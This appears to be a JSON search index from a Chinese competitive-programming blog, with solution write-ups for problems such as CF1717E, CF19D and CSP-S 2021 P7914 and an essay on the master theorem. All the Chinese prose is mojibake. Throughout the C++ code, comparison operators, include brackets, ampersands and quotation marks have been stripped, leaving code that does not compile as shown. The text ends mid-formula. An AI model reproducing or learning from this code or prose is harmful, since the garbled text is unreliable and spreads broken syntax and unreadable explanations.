å¦‚ä½•å¾—åˆ° npy","path":"/2022/09/07/P8509/","content":"ç¬¬ä¸€é—®å¾ˆå¥½æ±‚ï¼Œç›¸å½“äºæ˜¯æ‰€æœ‰ç‚¹åˆ° $s$ æˆ– $t$ ä¸­è¾ƒè¿‘çš„ç‚¹çš„æœ€çŸ­è·¯å¾„ä¹‹å’Œã€‚æ¢å¥è¯è¯´ï¼ŒæŠŠ $s$ ä¸ $t$ åˆ†åˆ«ä½œä¸ºèµ·ç‚¹ï¼Œè·‘ä¸¤éæœ€çŸ­è·¯åå¾—åˆ° $diss,dist$ åˆ†åˆ«è¡¨ç¤ºæœ€çŸ­è·¯ï¼Œåˆ™ç­”æ¡ˆå³ä¸º $\\sum\\limits_{i = 1}^{n} \\min (diss_i,dist_i)$ã€‚åˆç”±äºé¢˜ç›®ç»™çš„æ˜¯ä¸€æ£µæ ‘ï¼Œæ‰€ä»¥å…¶å®è·ç¦»å°±ç›¸å½“äºæ™®é€šçš„å­æ ‘å‘çˆ¶äº²èŠ‚ç‚¹çš„è½¬ç§»ã€‚ç¬¬ä¸€é—®çš„ä»£ç å¦‚ä¸‹ï¼š void dfs (int u,int fa,ll *dis) for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; dis[v] = dis[u] + val[i]; dfs (v,u,dis); dfs (s,0,dis1);dfs (t,0,dis2);for (int i = 1;i = n;++i) ansdis[i] = min (dis1[i],dis2[i]),ans += ansdis[i];printf (%lld ,ans); ç¬¬äºŒé—®ç›¸å½“äºæ˜¯è¿˜åŸè·¯å¾„ï¼Œå†æ¬¡è·‘ä¸¤éæœ€çŸ­è·¯ï¼Œå½“è·‘åˆ°ä¸€ä¸ªèŠ‚ç‚¹ $u$ æ—¶ï¼Œè‹¥å‘ç° $ansdis_u$ åŠ ä¸Šè¾¹æƒåæ°å¥½ç­‰äº $ansdis_v$ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªå¯èƒ½çš„è¿˜åŸæ–¹å¼ï¼ŒæŠŠè¿™ä¸ªç‚¹æ‰€åœ¨çš„è¾¹æ ‡è®°ä¸€ä¸‹ã€‚ å½“æ‰€æœ‰ç‚¹æ ‡è®°ä»¥åï¼Œå°è¯•è¿›è¡Œåˆ¤æ–­å‡ºå…¥è¾¹ã€‚è€ƒè™‘ç¬¬ $i$ æ¡åŒå‘è¾¹æ»¡è¶³è¾¹çš„ä¸‹æ ‡ $x,y$ ä¸º $2i,2i+1$ æ—¶å­˜åœ¨æ€§è´¨ $x \\oplus 1 = y,y \\oplus 1 = x$ï¼Œæ‰€ä»¥å½“ä¸‹æ ‡ä¸ºå¥‡æ•°æ—¶ç›¸å½“äºä»èµ·ç‚¹ $s,t$ çš„å‡ºè¾¹ï¼Œåœ¨æ„é€ ç­”æ¡ˆæ—¶éœ€è¦æ³¨æ„å‡ºå…¥æ°å¥½åå‘ã€‚äºæ˜¯æˆ‘ä»¬ä¾¿å¾—åˆ°äº†ç¬¬äºŒé—®çš„ä»£ç ï¼š void solve (int u,int fa) for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; if (min (dis1[v],dis2[v]) == ansdis[u] + val[i]) vis[v] = i;//èƒ½å¤Ÿè¿˜åŸæ—¶è®°å½•è¯¥ç‚¹æ‰€åœ¨è¾¹ solve (v,u); solve (s,0);solve (t,0);for (int i = 1;i = n;++i)//åˆ©ç”¨åŒå‘è¾¹çš„æ€§è´¨è¿›è¡Œæ„é€  if (!vis[i]) continue; ty[vis[i] 1] = (vis[i] 1) ? 1 : 2;//æ³¨æ„æ°å¥½ç›¸åfor (int i = 1;i n;++i) printf (%d,ty[i]);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1717E Madoka and The Best University","path":"/2022/09/03/CF1717E/","content":"çœ‹åˆ°é¢˜ç›®ï¼Œæœ‰ä¸‰ä¸ªå˜é‡ï¼Œé¦–å…ˆæƒ³åˆ°æ¶ˆå‚ã€‚ç”±è¾—è½¬ç›¸å‡æ³•å¯çŸ¥ $\\gcd (a,b) = \\gcd (a,a + b)$ï¼Œåˆå› ä¸º $a + b + c = n$ï¼Œæ‰€ä»¥ $a + b = n - c$ï¼Œå³ $\\gcd (a,b) = \\gcd (a,n - c)$ã€‚ ä»¤ $g = \\gcd (a,n - c)$ï¼Œå°†é¢˜ç›®æ‰€æ±‚è¿›è¡Œè½¬åŒ–ï¼Œåˆ™æœ‰ $\\sum \\mathrm{lcm} (c,\\gcd (a,b)) = \\sum \\mathrm{lcm} (c,\\gcd (a,n - c))$ã€‚æšä¸¾ $c,g$ï¼Œä¸éš¾å‘ç°ç­”æ¡ˆä¸ $a$ çš„å¤§å°æ— ç›´æ¥è”ç³»ï¼Œåªä¸ç¬¦åˆæ¡ä»¶çš„ $a$ çš„ä¸ªæ•°æœ‰å…³ã€‚ç”± $\\gcd$ çš„å®šä¹‰å¯çŸ¥ï¼Œ$\\gcd (\\frac{a}{g},\\frac{n - c}{g}) = 1$ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¦åˆæ¡ä»¶çš„ $a$ æ»¡è¶³ $\\frac{a}{g}\\perp\\frac{n - c}{g}$ï¼Œä¸éš¾æƒ³åˆ°æ¬§æ‹‰å‡½æ•° $\\varphi(x)$ è¡¨ç¤ºä¸ $x$ äº’è´¨çš„æ•°çš„ä¸ªæ•°ã€‚äºæ˜¯ç­”æ¡ˆå°±å˜ä¸º $\\sum \\limits_{g \\mid n - c}\\mathrm{lcm} (c,g) \\times \\varphi(\\frac{n - c}{g})$ï¼Œé¢„å¤„ç†æ¬§æ‹‰å‡½æ•°ä¾¿å¯è§£å†³é—®é¢˜ã€‚ ä½†æ˜¯åœ¨ç¼–å†™ä»£ç çš„æ—¶å€™è¿˜éœ€è¦æ³¨æ„ä¸€äº›ç»†èŠ‚ï¼Œ$a,b,c$ éƒ½æ˜¯æ­£æ•´æ•°ï¼Œæ‰€ä»¥æšä¸¾çš„æ—¶å€™ $c \\in [1,n - 2]$ï¼Œæšä¸¾å› æ•°çš„æ—¶å€™è¦æ»¡è¶³ $a n - c = a + b$ï¼Œæ‰€ä»¥ $a = 1$ çš„æ—¶å€™ $\\frac{n - c}{a}$ åº”è¯¥èˆå»ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,cnt,ans,p[MAX],phi[MAX],flag[MAX];int gcd (int x,int y) return (!y) ? x : gcd (y,x % y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); phi[1] = 1; for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i,phi[i] = i - 1; for (int j = 1;j = cnt;++j) if (i * p[j] n) break; flag[i * p[j]] = 1; if (i % p[j] == 0) phi[i * p[j]] = phi[i] * p[j]; break; phi[i * p[j]] = phi[i] * (p[j] - 1); for (int i = 1;i = n - 2;++i) int k = n - i; for (int j = 1;j * j = k;++j) if (k % j != 0) continue; ans += 1ll * i * j / gcd (i,j) * phi[k / j] % MOD; ans %= MOD; if (j != 1 k / j != j) ans += 1ll * i * k / j / gcd (i,k / j) * phi[j] % MOD,ans %= MOD; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF19D Points","path":"/2022/08/29/CF19D/","content":"æ‰€æœ‰æ“ä½œå‡å»ºç«‹åœ¨äºŒç»´å¹³é¢ä¸Šï¼Œå®¹æ˜“æƒ³åˆ° STL åº“çš„ setã€‚å°†ç‚¹çš„ $y$ åæ ‡æ”¾å…¥åˆ°å¯¹åº”çš„é›†åˆ $x$ ä¸­è¿›è¡Œç›¸åº”çš„æ“ä½œã€‚æ’å…¥æ“ä½œä¸º s[x].insert (y)ï¼Œåˆ é™¤æ“ä½œä¸º s[x].erase (y)ï¼Œè€ŒæŸ¥è¯¢æ“ä½œéœ€è¦ä»å°åˆ°å¤§éå†ä¸‹æ ‡å¤§äº $x$ çš„é›†åˆï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªä¸ä¸ºç©ºçš„é›†åˆä¸”é›†åˆä¸­å­˜åœ¨ä¸€ä¸ªå…ƒç´ å¤§äº $y$ã€‚ç”±é¢˜å¯çŸ¥ $x,y$ å‡è¾ƒå¤§ï¼Œä½†æ˜¯æœ€å¤šåªæœ‰ $2 \\times 10^5$ æ¬¡æ’å…¥ï¼Œå®¹æ˜“æƒ³åˆ°å°† $x$ è¿›è¡Œç¦»æ•£åŒ–ï¼Œæ‰€ä»¥æŸ¥è¯¢æ“ä½œå¯ä»¥å†™æˆï¼š //å¯¹äºæ‰€æœ‰ j å‡æ»¡è¶³å¤§äº x ï¼ˆç¦»æ•£åŒ–åçš„ç¼–å·ï¼‰if (!s[j].empty () s[j].upper_bound (q[i].y) != s[j].end ()) // print the answer ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ç¬¬ä¸€ä»½ä»£ç ï¼Œåªæ”¾äº†ä¸»å‡½æ•°çš„éƒ¨åˆ†ï¼š int main () n = read (); for (int i = 1;i = n;++i) scanf (%s,q[i].ty),q[i].x = read (),tmp[i] = q[i].x,q[i].y = read (); sort (tmp + 1,tmp + 1 + n); tot = unique (tmp + 1,tmp + n + 1) - tmp - 1; for (int i = 1;i = n;++i) q[i].id = lower_bound (tmp + 1,tmp + 1 + tot,q[i].x) - tmp;//ç¦»æ•£åŒ– for (int i = 1;i = n;++i) if (q[i].ty[0] == a) s[q[i].id].insert (q[i].y); else if (q[i].ty[0] == r) s[q[i].id].erase (q[i].y); else bool ok = 0; for (int j = q[i].id + 1;j = tot;++j) if (!s[j].empty () s[j].upper_bound (q[i].y) != s[j].end ()) ok = 1; printf (%d %d ,tmp[j],*s[j].upper_bound (q[i].y)); break;//æ‰¾åˆ°æœ€å°çš„ä¸€ä¸ªå³å¯ if (!ok) puts (-1);//ä¸å­˜åœ¨å°±è¾“å‡º -1 return 0; å®¹æ˜“çœ‹å¾—å‡ºå¤æ‚åº¦ä¸»è¦åœ¨æŸ¥è¯¢æ“ä½œä¸Šï¼Œæœ€åæƒ…å†µä¸‹å¯ä»¥è¾¾åˆ° $O(n^2)$ã€‚ç”±äºè¦æ‰¾åˆ°ä¸€ä¸ªæœ€å°çš„ç­”æ¡ˆï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œçº¿æ®µæ ‘ä¸Šçš„äºŒåˆ†ã€‚æ¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹çš„å­˜çš„æ˜¯ç¦»æ•£åŒ–å $x$ å¯¹åº”ç¼–å·çš„é›†åˆçš„æœ€å¤§å€¼ï¼Œæ¢å¥è¯è¯´ï¼Œå¦‚æœæœ€å¤§å€¼éƒ½ä¸ç¬¦é¢˜æ„ï¼Œé‚£ä¹ˆè¯¥é›†åˆä¸­ä¸€å®šæ— è§£ã€‚ å°† set ä¸çº¿æ®µæ ‘é…åˆç€ä½¿ç”¨ï¼Œæ’å…¥çš„åŒæ—¶å°†ç¦»æ•£åŒ–å $x$ å¯¹åº”ç¼–å·çš„é›†åˆçš„æ‰€å¯¹åº”çš„èŠ‚ç‚¹æ”¹ä¸ºå½“å‰é›†åˆçš„æœ€å¤§å€¼ï¼ˆå¯èƒ½ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ï¼Œåˆ é™¤æ“ä½œä¹Ÿæ˜¯åŒç†ï¼Œä½†è¦æ³¨æ„åˆ é™¤åé›†åˆä¸ºç©ºçš„æƒ…å†µã€‚ æŸ¥è¯¢æ“ä½œé€šè¿‡çº¿æ®µæ ‘æ±‚å¾—å¯¹åº”çš„ç¦»æ•£åŒ–åçš„ $x$ æˆ–è€…æ— è§£ï¼Œç„¶åå†é€šè¿‡ set é‡Œçš„å‡½æ•°æ±‚è§£ï¼Œå› æ­¤ä¸»è¦çš„éš¾åº¦åœ¨äºå¦‚ä½•å†™çº¿æ®µæ ‘çš„æŸ¥è¯¢æ“ä½œï¼Œè¿›è¡Œåˆ†ç±»è®¨è®ºï¼š åŒºé—´ä¸å­˜åœ¨æˆ–çº¿æ®µæ ‘çš„æŸä¸€ä¸ªåŒºé—´çš„æœ€å¤§å€¼å°äº $y$ï¼Œä¸ç¬¦ï¼Œç›´æ¥è¿”å› $-1$ã€‚ å·²ç»é€’å½’è‡³ä¸€ä¸ªå¤§å°ä¸º $1$ çš„ç¬¦åˆé¢˜æ„çš„åŒºé—´ï¼ˆé€€åŒ–æˆç‚¹ï¼‰ï¼Œä¹‹é—´è¿”å›ç«¯ç‚¹ç¼–å·ã€‚ é€’å½’å·¦åŒºé—´ï¼Œå¦‚æœåˆæ³•å°±è¿”å›å·¦åŒºé—´çš„é€’å½’å€¼ï¼›å¦åˆ™å†é€’å½’å³åŒºé—´ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¾—åˆ°äº†æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ çš„ä»£ç ï¼Œä¸€äº›é‡ç‚¹åœ¨æ³¨é‡Šä¸­æœ‰è®²ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include set#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,tot,cnt,k[MAX],tree[MAX 2]; struct node char ty[10]; int x,y; q[MAX];set int s[MAX];void modify (int cur,int l,int r,int x,int v);int query (int cur,int l,int r,int x,int y,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) scanf (%s,q[i].ty),q[i].x = read (),q[i].y = read (),k[++cnt] = q[i].x,k[++cnt] = q[i].y; sort (k + 1,k + 1 + cnt); tot = unique (k + 1,k + cnt + 1) - k - 1; for (int i = 1;i = n;++i)//x y éƒ½è¿›è¡Œäº†ç¦»æ•£åŒ– q[i].x = lower_bound (k + 1,k + 1 + tot,q[i].x) - k; q[i].y = lower_bound (k + 1,k + 1 + tot,q[i].y) - k;//y è¿›è¡Œç¦»æ•£åŒ–æ˜¯å› ä¸ºå­˜åœ¨ y = 0 çš„ç‚¹ ç¦»æ•£åŒ–åä¾¿äºä¸ç©ºé›†åˆä½œåŒºåˆ† for (int i = 1;i = n;++i) if (q[i].ty[0] == a) s[q[i].x].insert (q[i].y),modify (1,1,tot,q[i].x,*(--s[q[i].x].end ()));//æ’å…¥åæŸ¥æ‰¾æœ€å€¼ else if (q[i].ty[0] == r) s[q[i].x].erase (q[i].y); if (!s[q[i].x].size ()) modify (1,1,tot,q[i].x,0);//åŒºé—´ä¸ºç©ºï¼Œç›´æ¥æ›´æ–°æˆ 0 else modify (1,1,tot,q[i].x,*(--s[q[i].x].end ()));//åˆ é™¤åæŸ¥æ‰¾æœ€å€¼ else int pos = query (1,1,tot,q[i].x + 1,tot,q[i].y); if (pos == -1) puts (-1);//æ— è§£ else printf (%d %d ,k[pos],k[*s[pos].upper_bound (q[i].y)]);//è¿˜åŸæˆåŸæ¥çš„å€¼åè¾“å‡º return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void modify (int cur,int l,int r,int x,int v)//å•ç‚¹æ›´æ–° if (l == r) tree[cur] = v; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 1,r,x,v); tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);//ç»´æŠ¤æœ€å¤§å€¼int query (int cur,int l,int r,int x,int y,int v) if (tree[cur] = v || y l || x r) return -1;//æ— è§£ if (l == r) return l;//åŒºé—´é•¿åº¦ä¸º 1 int mid = (l + r) 1,s = query (cur 1,l,mid,x,y,v); if (~s) return s;//æœ‰è§£ æ˜¾ç„¶å·¦åŒºé—´çš„ç¼–å·æ›´å° return query (cur 1 | 1,mid + 1,r,x,y,v);//å·¦åŒºé—´æ— è§£åœ¨è¿›è¡Œå³åŒºé—´çš„é€’å½’","categories":["Solution"]},{"title":"æµ…è°ˆ $T(n) = a(\\lfloor\\frac{n}{b}\\rfloor) + f(n)$","path":"/2022/08/21/Time Complexity/","content":"ä¸»å®šç†ã€master theoremã€‘æœ¬æ–‡éƒ¨åˆ†å‚è€ƒã€Šç®—æ³•å¯¼è®ºã€‹ã€‚ç›¸å…³è¯æ˜ç”±äºè¿‡äºå¤æ‚ï¼Œå·²ç•¥å»ã€‚ å‰è¨€ $\\Theta$ è¯»ä½œ thetaï¼Œå³ç­‰äºã€‚ $O$ è¯»ä½œ big-ohï¼Œå³å°äºç­‰äºã€‚ $o$ è¯»ä½œ small-ohï¼Œå³å°äºã€‚ $\\Omega$ è¯»ä½œ big omegaï¼Œå³å¤§äºç­‰äºã€‚ $\\omega$ è¯»ä½œ small omegaï¼Œå³å¤§äºã€‚ $T(n)$ æ—¶é—´å¤æ‚åº¦ã€‚ $f(n)$ å…³äº $n$ çš„å‡½æ•°ã€‚ è‹¥ $f(x)$ å¤šé¡¹å¼å¤§äº $g(x)$ï¼Œåˆ™å­˜åœ¨å®æ•° $e 0$ï¼Œä½¿å¾— $f(x)g (x) \\times x^e$ã€‚ è‹¥ $f(x)$ æ¸è¿›å¤§äº $g(x)$ï¼Œåˆ™å­˜åœ¨å®æ•° $c 0$å’Œ $k$ï¼Œä½¿å¾—å¯¹äºä»»æ„ $n = k$ æœ‰ $c\\times f(x) = g(x)$ã€‚ å¯¹äº $\\log n$ï¼Œä¸éœ€è¦å¼„æ¸…å…¶å…·ä½“çš„åº•æ•°ã€‚åŸå› åœ¨äº $\\lim \\limits_{n \\to \\infty}\\frac{\\log_x n}{\\log_y n} = \\frac{\\ln y}{\\ln x}(x ot = y)$ã€‚å³ $\\log$ çº§åˆ«çš„æ¸è¿›æ„ä¹‰æ˜¯ä¸€æ ·çš„ã€‚ ä¸»å®šç†å¯¹äºä¸€ä¸ªå½¢å¦‚ $T(n) = aT(\\frac{n}{b}) + f(n)$ çš„å¼å­ï¼ˆä»¤ $a \\ge 1,b 1$ ä¸”ä¸ºå¸¸æ•°ï¼‰ï¼Œæœ‰ä»¥ä¸‹æ¸è¿‘ç•Œ ï¼š \\begin{cases} T(n) = \\Theta (n^{\\log_b a}) \\text{ If }\\exists \\varepsilon > 0,f(n) = O(n^{\\log_b a - \\varepsilon})\\\\\\\\ T(n) = \\Theta (n^{\\log_b a}\\log n) \\text{ If }f(n) = \\Theta(n^{\\log_b a})\\\\\\\\ T(n) = \\Theta (f(n)) \\text{ If } \\exists \\varepsilon > 0,f(n) = \\Omega(n^{\\log_b a + \\varepsilon}) \\text{ and If } \\forall n \\to \\infty,\\exists c < 1, \\ aT(\\frac{n}{b}) \\le cf(n)\\\\ \\end{cases}ç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥æè¿°æˆä»¥ä¸‹æƒ…å†µï¼š T(n)= \\begin{cases} O(n^d),d > \\log_b a\\\\\\\\ O(n^d \\log n),d = \\log_b a\\\\\\\\ O(n^{\\log_b a}),d < \\log_b a\\\\ \\end{cases}ä¾‹é¢˜ $T(n) = 2T(\\frac{n}{2}) + n$ \\because b = 2,a = 2,f(n) = \\Theta(n^{\\log_2 2}) = 1\\\\ \\therefore T(n) = \\Theta(n \\log n)\\\\ $T(n) = 9T(\\frac{n}{3}) + n$ \\because b = 3,a = 9,f(n) = n\\\\ \\because \\Theta (n^{\\log_b a}) = \\Theta (n^2),f(n) = O(n^{\\log_3 9 - \\varepsilon})= O(n^2) \\textit{ If }\\varepsilon = 1\\\\ \\therefore T(n) = \\Theta(n^2)\\\\ $T(n) = 3T(\\frac{n}{4}) + n \\log n$ \\because b = 4,a = 3,f(n) = n \\log n\\\\ \\because \\Theta (n^{\\log_b a}) = O (n^{0.793}),f(n) = \\Omega(n^{\\log_b a}) = \\Omega(n^{\\log_4 3 + \\varepsilon})\\textit{ If }\\varepsilon \\thickapprox 0.2\\\\ \\because n \\to \\infty,aT(\\frac{n}{b}) \\le cf(n) \\textit{ If } c = \\frac{3}{4}\\\\ \\therefore T(n) = \\Theta(n \\log n)\\\\ $T(n) = 2T(\\frac{n}{2}) + n \\log n$ å¯ä»¥æ±‚å‡º $b = 2,a = 2,f(n) = n \\log n,\\Theta (n^{\\log_b a}) = O (n)$ã€‚çœ‹ä¼¼æ˜¯ä¸»å®šç†çš„ç¬¬ä¸‰ç§æƒ…å†µï¼Œä½†æ˜¯å‘ç° $\\frac{f(n)}{n^{\\log_b a}} = \\log n n^\\varepsilon(\\varepsilon 0)$ï¼Œä¹Ÿå°±æ˜¯ $\\log n = o(n^\\varepsilon)$ï¼Œå³ä¸¤è€…ä¸åŒé˜¶ã€‚ æ•…åªèƒ½é‡‡å–é€’å½’æ ‘çš„æ–¹å¼è§£å†³ï¼Œå°†å¶å­èŠ‚ç‚¹ä¸éå¶å­èŠ‚ç‚¹åˆ†å¼€è®¡ç®—æœ€åç­”æ¡ˆæ˜¯ $\\Theta(2^{\\log n}) + \\Theta(n \\sum_{i = 1}^{\\log n} 1) = \\Theta(n) + \\Theta(n\\frac{\\log n(1 + \\log n)}{2}) \\thickapprox O(n \\log^2 n)$ã€‚ æ€»ç»“ å…¶ä¸­ç¬¬ä¸€æƒ…å†µè¦æ±‚çš„å°äºæ˜¯å¤šé¡¹å¼æ„ä¹‰ä¸‹çš„å°äºï¼Œä¹Ÿå°±æ˜¯ $f(n)$ æ¸è¿‘å°äº $n^{\\log_b a}$ï¼Œå³ç›¸å·®ä¸€ä¸ªå› å­ $n^\\varepsilon$ï¼Œå…¶ä¸­ $\\varepsilon$ æ˜¯ä¸€ä¸ªå¤§äº $0$ çš„å¸¸æ•°ã€‚ç¬¬ä¸‰ç§æƒ…å†µåŒç†ï¼Œä½†å¤šäº†ä¸€ä¸ªâ€œæ­£åˆ™â€çš„æ¡ä»¶ã€‚ $T(n) = \\Theta (n^{\\log_b}\\log^{k + 1} n) \\text{ If }f(n) = \\Theta(n^{\\log_b a} \\log^k n),k \\ge 1$ ä¸»å®šç†å¹¶ä¸èƒ½è¦†ç›–æ‰€æœ‰çš„æƒ…å†µï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡é€’å½’æ ‘çš„æ–¹å¼æ±‚è§£ã€‚","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼šSP13105 MUTDNA - DNA","path":"/2022/08/18/SPOJ13105/","content":"ç¬¬äºŒç§æ“ä½œæ˜¯ä» $1$ å¼€å§‹ä¿®æ”¹çš„ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ä¸€æ®µå‰ç¼€ï¼Œè€ƒè™‘é€’æ¨ã€‚ç”±äºæ“ä½œå¯é€†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è½¬æ¢ä¸ºå°†è¯»å…¥çš„ä¸²å˜ä¸ºå…¨ A ä¸²æ‰€éœ€çš„æœ€å°å˜æ¢æ¬¡æ•°ã€‚ è®¾ $f_{i,0}$ è¡¨ç¤ºå‰ $i$ ä¸ªå­—ç¬¦å‡ä¸º A æ—¶çš„æœ€å°å˜æ¢æ¬¡æ•°ï¼Œè®¾ $f_{i,1}$ è¡¨ç¤ºå‰ $i$ ä¸ªå­—ç¬¦å‡ä¸º B æ—¶çš„æœ€å°å˜æ¢æ¬¡æ•°ã€‚åœ¨å¤„ç†ç¬¬ $i$ ä¸ªå­—ç¬¦æ—¶ï¼Œå‰ $i - 1$ ä¸ªå­—ç¬¦åªæœ‰å…¨ A æˆ–å…¨ B ä¸¤ç§æƒ…å†µï¼Œè€Œæˆ‘ä»¬ç°åœ¨å¯ä»¥å°†å‰ $i$ ä¸ªå­—ç¬¦å˜ä¸ºå…¨ A æˆ–å…¨ Bã€‚ä»¤ç¬¬ $i$ ä¸ªå­—ç¬¦æ˜¯ Aï¼Œè¿›è¡Œåˆ†ç±»è®¨è®ºï¼š $f_{i - 1,0} \\to f_{i,0}$ ä¸éœ€è¦æ“ä½œï¼Œç›´æ¥åœ¨æœ«å°¾æ·»ä¸Š Aã€‚ $f_{i - 1,0} \\to f_{i,1}$ æ·»ä¸Š A åå°†åŒºé—´ $[1,i]$ è¿›è¡Œç¿»è½¬ã€‚ $f_{i - 1,1} \\to f_{i,0}$ å°†åŒºé—´ $[1,i - 1]$ è¿›è¡Œç¿»è½¬ï¼Œä¹‹åæ·»ä¸Š Aã€‚ $f_{i - 1,1} \\to f_{i,1}$ å°†åŒºé—´ $[1,i - 1]$ è¿›è¡Œç¿»è½¬ï¼Œä¹‹åå°† A å˜ä¸º B å¹¶æ·»ä¸Šã€‚æ“ä½œç­‰ä»·äº $f_{i,0} \\to f_{i,1}$ã€‚ è‹¥ç¬¬ $i$ ä¸ªå­—ç¬¦æ˜¯ B åŒç†ã€‚æœ€åçš„è¦æ±‚å…¨ä¸º A ä¸²ï¼Œç­”æ¡ˆä¹Ÿå°±æ˜¯ $\\min (f_{n,0},f_{n,1} + 1)$ã€‚ ç”±äº $f_{i,0},f_{i,1}$ åªä¸ $f_{i - 1,0},f_{i - 1,1}$ æœ‰å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°† $f$ æ•°ç»„çš„ç¬¬ä¸€ç»´æ»šæ‰ï¼Œå³ç©ºé—´ä¸Šçš„ä¸€ä¸ªä¼˜åŒ–ã€‚ æœ€åä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,f[2][2];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) char ch;scanf (%c,ch); if (ch == A) f[1][0] = min (f[0][0],f[0][1] + 1),f[1][1] = min (f[1][0],f[0][1]) + 1;//f[1][0] ä¹‹å‰å·²ç»ç®—å‡ºï¼Œç›´æ¥ä½¿ç”¨ else f[1][1] = min (f[0][1],f[0][0] + 1),f[1][0] = min (f[1][1],f[0][0]) + 1; f[0][0] = f[1][0],f[0][1] = f[1][1]; printf (%d ,min (f[0][0],f[0][1] + 1)); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP7914 [CSP-S 2021] æ‹¬å·åºåˆ—","path":"/2022/08/05/P7914/","content":"è¿™æ˜¯ä¸€é“åŒºé—´ dpï¼Œæ€ç»´éš¾åº¦ä¸å®ç°éš¾åº¦éƒ½ä¸å°ï¼Œä¸»è¦çš„ç“¶é¢ˆåœ¨äºå¦‚ä½•ä¸é‡ä¸æ¼åœ°è½¬ç§»ï¼ˆè¿™è¦æ±‚ä»”ç»†åœ°è¯»é¢˜ï¼‰ã€‚ å’Œé¢˜ç›®ä¸€æ ·ï¼ŒA è¡¨ç¤ºä¸€ä¸ªç¬¦åˆè§„èŒƒçš„è¶…çº§æ‹¬å·åºåˆ—ï¼ŒS è¡¨ç¤ºä»»æ„ä¸€ä¸ªä»…ç”±ä¸è¶…è¿‡ $k$ ä¸ªå­—ç¬¦ * ç»„æˆçš„éç©ºå­—ç¬¦ä¸²ï¼Œå³ *...*ã€‚ä»¥ä¸‹å°±ä¸å†èµ˜è¿°å­—ç¬¦çš„å«ä¹‰ã€‚ å…ˆå°†çŠ¶æ€åˆ†æˆä»¥ä¸‹å‡ ç±»ï¼š $dp_{i,j,0}$ è¡¨ç¤º $[i,j]$ çš„ç¬¦åˆè§„èŒƒçš„è¶…çº§æ‹¬å·åºåˆ—çš„æ•°é‡ $dp_{i,j,1}$ è¡¨ç¤º $[i,j]$ çš„ç¬¦åˆ (A) çš„å½¢å¼çš„æ•°é‡ $dp_{i,j,2}$ è¡¨ç¤º $[i,j]$ çš„ç¬¦åˆ SA çš„å½¢å¼çš„æ•°é‡ $dp_{i,j,3}$ è¡¨ç¤º $[i,j]$ çš„ç¬¦åˆ AS çš„å½¢å¼çš„æ•°é‡ æ¥ä¸‹å»å°±æ˜¯çŠ¶æ€è½¬ç§»çš„è¿‡ç¨‹ã€‚ å…ˆé¢„å¤„ç†å‡ºä¸€ä¸ªå¸ƒå°”æ•°ç»„ $g$ï¼Œè‹¥ $g_{i,j} = 1$ ï¼Œé‚£ä¹ˆæœ‰ $[i,j]$ ä¸ºä¸€ä¸ª $S$ ä¸²ã€‚ å¯¹äº (A) çš„å½¢å¼ï¼Œå¯ä»¥ç”± *...*ï¼ŒSAï¼ŒAS å’Œ A åŠ ä¸Šä¸€å¯¹å·¦å³æ‹¬å·å³å¯å¾—åˆ°ã€‚ä¹Ÿå°±æ˜¯è¯´è‹¥ $[i,j]$ æ»¡è¶³ (A) çš„å½¢å¼ï¼Œä¹Ÿå°±æœ‰åŸå­—ç¬¦ä¸²çš„ç¬¬ $i$ ä½ä¸º ( æˆ– ?ï¼Œç¬¬ $j$ ä½ä¸º ) æˆ– ?ã€‚è½¬ç§»ä¸º $dp_{i,j,1} = g_{i + 1,j - 1} + dp_{i + 1,j 